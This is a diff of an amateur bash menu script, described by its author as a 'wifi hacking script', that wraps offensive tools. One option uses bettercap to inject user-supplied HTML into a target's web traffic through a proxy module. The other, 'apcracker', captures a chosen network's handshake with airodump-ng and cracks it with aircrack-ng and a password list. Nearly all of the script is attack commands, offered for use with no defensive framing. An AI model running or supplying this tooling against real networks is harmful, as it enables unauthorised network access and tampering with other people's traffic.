@@ -1,7 +1,7 @@
 echo "this is my wifi hacking script..."
 sleep 3s
 clear
-PS3="what wifi hack would you like to use today?: "
+PS3="what wifi hack would you like to use today?"
 select wifi in bettercap apcracker
 do
 case $wifi in
@@ -33,15 +33,20 @@ then
 echo "html code to input here"
 read htmlinject
 echo "press crtl+c to close the spoofing/hack"
-bettercap $target --proxy-module $inject
-#################################################################################################################################
-aircracker suite)
-airodump-ng wlan0mon
-
-
-
-
-
-
+bettercap $target --proxy-module $inject ;;
+apcracker)
+xterm -hold -e airodump-ng wlan0mon
+echo "input channel here"
+read channel
+echo "input bssid"
+read bssid
+echo "writefile name"
+read writefile
+xterm -e -hold airodump-ng -c $channel -b $bssid wlan0mon -w $writefile
+echo "path to password list"
+read password
+echo "router mac"
+read mac
+xterm -e -hold aircrack-ng -w $password -b $mac *.cap ;;
 esac
 done
